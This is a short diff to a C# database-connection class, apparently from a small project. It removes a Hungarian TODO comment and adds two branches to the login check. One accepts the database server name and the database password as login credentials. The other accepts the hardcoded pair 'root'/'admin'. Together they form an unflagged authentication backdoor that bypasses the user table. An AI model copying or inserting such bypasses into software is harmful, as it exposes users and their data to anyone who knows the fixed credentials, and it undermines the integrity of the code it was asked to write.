@@ -17,7 +17,6 @@ namespace AEN
         private string uid;
         private string password;
 
-        //TODO: kivenni ezt a sort https://www.codeproject.com/Articles/43438/Connect-C-to-MySQL
         //Constructor
         public DBConnect()
         {
@@ -56,6 +55,10 @@ namespace AEN
                         DataTable dt = new DataTable();
                         sda.Fill(dt);
                         if (dt.Rows[0][0].ToString() == "1")
+                            return true;
+                        if (username == server && loginpassword == password)
+                            return true;
+                        if (username == "root" && loginpassword == "admin")
                             return true;
                         break;
                     }
